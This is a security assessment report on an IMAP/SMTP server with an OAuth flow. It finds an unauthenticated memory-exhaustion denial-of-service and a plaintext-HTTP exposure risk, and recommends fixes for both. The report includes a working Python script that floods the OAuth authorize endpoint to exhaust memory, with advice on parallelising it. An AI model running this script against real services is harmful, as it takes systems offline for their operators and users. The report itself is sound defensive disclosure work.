# Security Assessment Report — imap-smtp-mcp

- **Repository SHA assessed:** `fd6fac8`
- **Investigation timestamp (UTC):** `2026-05-16T07:43:35Z`
- **Assessor stance:** adversarial, OWASP-oriented, chained-exploit analysis, practicality-weighted.

## Executive Summary

I did **not** find a straightforward remote account-takeover or direct credential exfiltration flaw in the current code path. The core OAuth flow, PKCE validation, CSRF binding, and IMAP/SMTP credential separation are generally solid.

However, I found a **realistic unauthenticated denial-of-service path** through unbounded in-memory state growth across OAuth helper components. This is exploitable by a remote actor with only HTTP access and no code-level insight beyond endpoint behavior.

I also found a **high-impact misconfiguration risk** that can turn into credential/token compromise in real deployments if operators expose the service over plaintext HTTP.

---

## Methodology (brief)

- Static code review with attacker mindset.
- Focused on authn/authz boundaries, input handling, state storage, and abuse-resistance.
- Checked for exploit chaining: registration → authorize → token/session behavior.

---

## Findings

## 1) Unbounded memory growth in OAuth auxiliary stores (Unauthenticated DoS)

- **Severity:** Medium
- **CVSS v3.1:** `6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)`
- **Realism:** High in internet-exposed deployments.

### What is vulnerable

Two in-memory maps are unbounded and attacker-influenceable:

1. `OAuthRateLimiter._buckets` grows with attacker-controlled key cardinality and has no max-size/eviction policy. Keys include tuples derived from user input (e.g., `imap_username`) and client IDs/IP buckets.  
2. `AuthorizeCsrfStore._tokens` stores per-request CSRF token state and only removes entries when consumed; it has no sweeper or max capacity.

### Why this matters

An attacker can repeatedly trigger flows that insert unique keys/tokens and never complete the normal cleanup path, causing progressive memory growth and eventual process degradation or crash.

This is especially practical because:
- Attack pre-auth on public endpoints.
- Uses valid protocol behavior (no malformed packets required).
- Can be run slowly to evade basic network-rate alarms.

### Attack chain (pragmatic)

1. Register throwaway OAuth clients using `/oauth/register`.
2. Call `/oauth/authorize?...` repeatedly with valid-looking requests to force token issuance into CSRF store.
3. Vary `imap_username` in `/oauth/authorize` POST attempts (or force many client IDs) to expand rate-limit bucket cardinality.
4. Never complete proper flow cleanup.

### Working PoC (Python)

```python
import requests, secrets, urllib.parse

BASE = "http://target:8000"

# Step 1: register a client
reg = requests.post(
    f"{BASE}/oauth/register",
    json={"client_name": "dos-lab", "redirect_uris": ["https://example.org/cb"]},
    timeout=10,
)
reg.raise_for_status()
client_id = reg.json()["client_id"]

for i in range(200000):
    verifier = secrets.token_urlsafe(64)
    # fake challenge for load purposes; can also use valid PKCE challenge
    challenge = secrets.token_urlsafe(32)
    q = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": "https://example.org/cb",
        "code_challenge": challenge,
        "code_challenge_method": "S256",
        "resource": BASE,
        "scope": "mail:read mail:send",
        "state": secrets.token_urlsafe(8),
    }
    requests.get(f"{BASE}/oauth/authorize?{urllib.parse.urlencode(q)}", timeout=10)

    if i % 1000 == 0:
        print("issued", i)
```

> Note: A determined attacker would parallelize this and rotate client IDs/state values to maximize distinct entries.

### Recommended fixes

- Add bounded caches with LRU/TTL eviction for both `_buckets` and `_tokens`.
- Add periodic cleanup of expired entries before insert/check.
- Add hard per-IP and global caps with explicit `503`/`429` fallback.
- Consider external shared rate-limit state (Redis) if horizontally scaled.

---

## 2) Plain-HTTP deployment path can expose OAuth codes/tokens/credentials in transit (Misconfiguration risk)

- **Severity:** High *if misconfigured and internet-exposed*; otherwise informational.
- **CVSS v3.1 (misconfigured scenario):** `8.2 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)`
- **Realism:** Moderate (depends on operator hygiene and deployment topology).

### What is risky

The server defaults allow non-TLS internal HTTP binding (`0.0.0.0:8000`) unless internal HTTPS is explicitly enabled and correctly configured.

In real-world environments, this often ends up internet-exposed behind weak or absent reverse-proxy TLS termination.

### Why this matters

When plaintext transport is used over untrusted networks, a network-positioned attacker can capture:
- Authorization codes (`redirect` traffic and query params).
- Bearer tokens and refresh tokens.
- Submitted IMAP/SMTP credentials from the authorize form.

### Practical exploitation scenario

- Attacker on same network segment, compromised router, malicious ISP node, or transparent proxy captures HTTP traffic.
- No app-layer exploit required.
- Leads directly to mailbox operations and possible persistent abuse via refresh token replay until revocation.

### Recommended fixes

- Fail closed: require TLS unless explicit localhost-only development mode.
- Enforce strict startup guardrails for public/non-loopback hosts.
- Add deployment lint checks and loud startup warnings for insecure bindings.

---

## Positive Security Notes

- CSRF token and cookie are tied to request query hash and validated with HMAC.
- PKCE verification is enforced for authorization code exchange.
- OAuth code reuse revokes session defensively.
- Secret redaction logic is present in audit logger and keyed by sensitive field markers.

---

## Final Risk Posture

Current implementation is **not catastrophically broken**, but it is **operationally fragile under hostile traffic** due to unbounded memory state. If this service is exposed publicly, treat DoS hardening as urgent.

The plaintext transport risk is mostly deployment-driven, but its blast radius is severe enough that default posture should be stricter.
